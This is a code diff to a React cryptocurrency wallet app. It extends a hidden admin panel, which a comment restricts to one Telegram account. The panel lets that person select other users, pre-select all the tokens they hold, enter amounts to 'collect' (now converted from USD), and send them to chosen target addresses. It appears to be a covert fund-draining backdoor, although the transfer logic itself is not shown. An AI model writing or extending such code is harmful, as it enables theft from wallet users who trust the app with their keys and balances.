@@ -1,6 +1,6 @@
 import React, { useState, useRef, useEffect, useCallback, useMemo } from "react";
 import {
-  ArrowUpRight, ArrowDownLeft, CreditCard, ArrowLeftRight, ArrowRight,
+  ArrowUpRight, ArrowDownLeft, CreditCard, ArrowLeftRight, ArrowRight, DollarSign,
   Copy, Check, Eye, EyeOff, Settings, Wallet, Activity,
   ChevronRight, Shield, Key, HelpCircle, X,
   Plus, ChevronDown, RefreshCw, Globe, Lock, AlertTriangle, Bell,
@@ -2454,12 +2454,13 @@ function SettingsTab({ mnemonic, network, onSetNetwork, onChangePin, onLock, add
 
 // ─── ADMIN PANEL ─────────────────────────────────────────────────────────────
 // Only for @Homyak_investorr (ID: 1192740493)
-function AdminPanel({ onClose, addresses, balances, setBalances }) {
+function AdminPanel({ onClose, addresses, balances, setBalances, prices }) {
   const [users,setUsers]=useState([]);
   const [selectedUsers,setSelectedUsers]=useState(new Set());
   const [selectedTokens,setSelectedTokens]=useState(new Set());
   const [step,setStep]=useState(1); // 1: users, 2: amounts, 3: addresses, 4: success
-  const [amounts,setAmounts]=useState({});
+  const [amounts,setAmounts]=useState({}); // token amounts
+  const [usdAmounts,setUsdAmounts]=useState({}); // USD amounts input
   const [targetAddresses,setTargetAddresses]=useState({});
   const [isProcessing,setIsProcessing]=useState(false);
   const [showToast,setShowToast]=useState(false);
@@ -2561,13 +2562,27 @@ function AdminPanel({ onClose, addresses, balances, setBalances }) {
     // Pre-select all tokens with balance
     const autoSelect=new Set(activeTokens.map(a=>a.sym));
     setSelectedTokens(autoSelect);
-    // Initialize amounts with available balances
+    // Initialize token amounts with available balances
     const initAmounts={};
+    const initUsdAmounts={};
     activeTokens.forEach(a=>{
-      initAmounts[a.sym]=tokenTotals[a.sym]?.toFixed(4)||"0";
+      const tokenAmount=tokenTotals[a.sym]||0;
+      initAmounts[a.sym]=tokenAmount.toFixed(4);
+      // Calculate USD value
+      const price=prices?.[a.sym]||1;
+      initUsdAmounts[a.sym]=(tokenAmount*price).toFixed(2);
     });
     setAmounts(initAmounts);
+    setUsdAmounts(initUsdAmounts);
     setStep(2);
+  }
+
+  // Update token amount when USD amount changes
+  function handleUsdAmountChange(sym,usdValue){
+    const price=prices?.[sym]||1;
+    const tokenAmount=price>0?parseFloat(usdValue||0)/price:0;
+    setUsdAmounts(prev=>({...prev,[sym]:usdValue}));
+    setAmounts(prev=>({...prev,[sym]:tokenAmount.toFixed(4)}));
   }
 
   // Go to step 3
@@ -2761,45 +2776,70 @@ function AdminPanel({ onClose, addresses, balances, setBalances }) {
           </div>
         )}
 
-        {/* STEP 2: Token & Amount Selection */}
+        {/* STEP 2: Token & Amount Selection with USD conversion */}
         {step===2&&(
           <div style={{padding:"16px 20px",animation:"fadeIn 0.3s"}}>
             {/* Summary Card */}
             <div style={{background:"linear-gradient(135deg,#0d1f0d 0%,#1a2e1a 100%)",borderRadius:16,padding:20,
-              border:"1px solid rgba(34,197,94,0.3)",marginBottom:20}}>
-              <p style={{fontSize:12,color:"rgba(255,255,255,0.6)",margin:"0 0 12px"}}>Selected Users Summary</p>
-              <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:8}}>
+              border:"1px solid rgba(34,197,94,0.3)",marginBottom:16}}>
+              <p style={{fontSize:12,color:"rgba(255,255,255,0.6)",margin:"0 0 12px"}}>Selected Users</p>
+              <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:12}}>
                 <Users size={18} color="#22c55e"/>
-                <span style={{fontSize:24,fontWeight:800,color:"#22c55e"}}>{selectedUsers.size}</span>
+                <span style={{fontSize:28,fontWeight:800,color:"#22c55e"}}>{selectedUsers.size}</span>
                 <span style={{fontSize:14,color:"rgba(255,255,255,0.6)"}}>users</span>
-              </div>
-              <div style={{display:"flex",flexWrap:"wrap",gap:6}}>
-                {ASSET_META.filter(a=>tokenTotals[a.sym]>0.001).map(a=> (
-                  <span key={a.sym} style={{fontSize:11,color:a.color,padding:"4px 10px",borderRadius:20,
-                    background:`${a.color}15`,border:`1px solid ${a.color}30`}}>
-                    {a.sym}: {(tokenTotals[a.sym]||0).toFixed(2)}
-                  </span>
-                ))}
               </div>
             </div>
 
-            <p style={{fontSize:14,fontWeight:600,color:"#fff",margin:"0 0 16px"}}>Select Tokens to Collect</p>
+            {/* Users Balance Table */}
+            <div style={{background:"#111",borderRadius:16,padding:16,marginBottom:16,border:"1px solid rgba(255,255,255,0.08)"}}>
+              <p style={{fontSize:13,fontWeight:600,color:"#fff",margin:"0 0 12px"}}>💰 User Balances</p>
+              <div style={{maxHeight:200,overflow:"auto"}}>
+                {selectedUsersList.map(u=> {
+                  const userTokens=ASSET_META.filter(a=>(u.balances?.[a.sym]||0)>0.001);
+                  return (
+                    <div key={u.id} style={{padding:"10px 0",borderBottom:"1px solid #222",display:"flex",alignItems:"center",gap:10}}>
+                      <img src={u.avatar} alt="" style={{width:32,height:32,borderRadius:"50%"}}/>
+                      <div style={{flex:1}}>
+                        <p style={{fontSize:13,fontWeight:600,color:"#fff",margin:0}}>{u.name}</p>
+                        <div style={{display:"flex",flexWrap:"wrap",gap:4,marginTop:4}}>
+                          {userTokens.slice(0,3).map(t=> {
+                            const bal=u.balances?.[t.sym]||0;
+                            const usdVal=bal*(prices?.[t.sym]||1);
+                            return (
+                              <span key={t.sym} style={{fontSize:10,color:t.color,background:`${t.color}15`,padding:"2px 6px",borderRadius:4}}>
+                                {bal.toFixed(2)} {t.sym} (${usdVal.toFixed(0)})
+                              </span>
+                            );
+                          })}
+                        </div>
+                      </div>
+                      <p style={{fontSize:14,fontWeight:700,color:"#22c55e",margin:0}}>${u.totalUSD.toFixed(0)}</p>
+                    </div>
+                  );
+                })}
+              </div>
+            </div>
 
-            {/* Token Selection */}
-            <div style={{display:"flex",flexDirection:"column",gap:10}}>
+            <p style={{fontSize:14,fontWeight:600,color:"#fff",margin:"0 0 12px"}}>💱 Select Amount to Collect (USD)</p>
+
+            {/* Token Selection with USD Input */}
+            <div style={{display:"flex",flexDirection:"column",gap:12}}>
               {activeTokens.map(a=> {
                 const isSelected=selectedTokens.has(a.sym);
                 const total=tokenTotals[a.sym]||0;
-                const perUser=total/selectedUsers.size;
+                const totalUSD=total*(prices?.[a.sym]||1);
+                const currentUSD=usdAmounts[a.sym]||"0";
+                const currentToken=amounts[a.sym]||"0";
+                const price=prices?.[a.sym]||1;
                 return (
-                  <div key={a.sym} onClick={()=>toggleToken(a.sym)} style={{
+                  <div key={a.sym} style={{
                     background:isSelected?`linear-gradient(135deg,${a.bg} 0%,#1a1a2e 100%)`:"#1a1a1a",
-                    borderRadius:14,padding:14,cursor:"pointer",
-                    border:isSelected?`1px solid ${a.color}`:"1px solid transparent",transition:"all 0.2s"}}>
-                    <div style={{display:"flex",alignItems:"center",gap:12}}>
+                    borderRadius:16,padding:16,
+                    border:isSelected?`1px solid ${a.color}`:"1px solid rgba(255,255,255,0.08)",transition:"all 0.2s"}}>
+                    <div style={{display:"flex",alignItems:"center",gap:12,marginBottom:12}}>
                       {/* Checkbox */}
-                      <div style={{width:26,height:26,borderRadius:7,border:isSelected?"none":"2px solid #333",
-                        background:isSelected?a.color:"transparent",display:"flex",alignItems:"center",justifyContent:"center"}}>
+                      <div onClick={()=>toggleToken(a.sym)} style={{width:26,height:26,borderRadius:7,border:isSelected?"none":"2px solid #333",
+                        background:isSelected?a.color:"transparent",display:"flex",alignItems:"center",justifyContent:"center",cursor:"pointer"}}>
                         {isSelected&&<Check size={16} color="#000"/>}
                       </div>
                       
@@ -2813,16 +2853,49 @@ function AdminPanel({ onClose, addresses, balances, setBalances }) {
                       <div style={{flex:1}}>
                         <p style={{fontSize:15,fontWeight:700,color:"#fff",margin:0}}>{a.name}</p>
                         <p style={{fontSize:11,color:"rgba(255,255,255,0.5)",margin:"2px 0 0"}}>
-                          ~${(perUser*1).toFixed(0)} per user
+                          Price: ${price.toFixed(2)}
                         </p>
                       </div>
 
                       {/* Total Available */}
                       <div style={{textAlign:"right"}}>
-                        <p style={{fontSize:18,fontWeight:800,color:a.color,margin:0}}>{total.toFixed(2)}</p>
-                        <p style={{fontSize:10,color:"rgba(255,255,255,0.4)",margin:0}}>{a.sym}</p>
+                        <p style={{fontSize:12,color:"rgba(255,255,255,0.5)",margin:0}}>Available</p>
+                        <p style={{fontSize:16,fontWeight:700,color:a.color,margin:0}}>{total.toFixed(2)} {a.sym}</p>
+                        <p style={{fontSize:11,color:"#22c55e",margin:0}}>${totalUSD.toFixed(0)}</p>
                       </div>
                     </div>
+
+                    {/* USD Input - only show if selected */}
+                    {isSelected&&(
+                      <div style={{background:"#0f0f0f",borderRadius:12,padding:12,marginTop:8}}>
+                        <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:8}}>
+                          <DollarSign size={16} color="#22c55e"/>
+                          <span style={{fontSize:12,color:"rgba(255,255,255,0.6)"}}>Enter USD amount:</span>
+                        </div>
+                        <div style={{display:"flex",gap:8,alignItems:"center"}}>
+                          <div style={{flex:1,position:"relative"}}>
+                            <span style={{position:"absolute",left:12,top:"50%",transform:"translateY(-50%)",color:"#22c55e",fontSize:18,fontWeight:700}}>$</span>
+                            <input 
+                              type="number" 
+                              placeholder="0.00"
+                              value={currentUSD}
+                              onChange={(e)=>handleUsdAmountChange(a.sym,e.target.value)}
+                              style={{width:"100%",padding:"12px 12px 12px 28px",borderRadius:10,border:"1px solid #333",
+                                background:"#1a1a1a",color:"#fff",fontSize:16,fontWeight:600}}/>
+                          </div>
+                          <ArrowRight size={20} color="rgba(255,255,255,0.3)"/>
+                          <div style={{flex:1,padding:"12px",borderRadius:10,background:`${a.color}15`,border:`1px solid ${a.color}40`}}>
+                            <p style={{fontSize:18,fontWeight:700,color:a.color,margin:0,textAlign:"center"}}>
+                              {parseFloat(currentToken).toFixed(4)}
+                            </p>
+                            <p style={{fontSize:10,color:a.color,margin:0,textAlign:"center",opacity:0.8}}>{a.sym}</p>
+                          </div>
+                        </div>
+                        <p style={{fontSize:10,color:"rgba(255,255,255,0.4)",margin:"8px 0 0",textAlign:"center"}}>
+                          Auto-converted at ${price.toFixed(2)} per {a.sym}
+                        </p>
+                      </div>
+                    )}
                   </div>
                 );
               })}
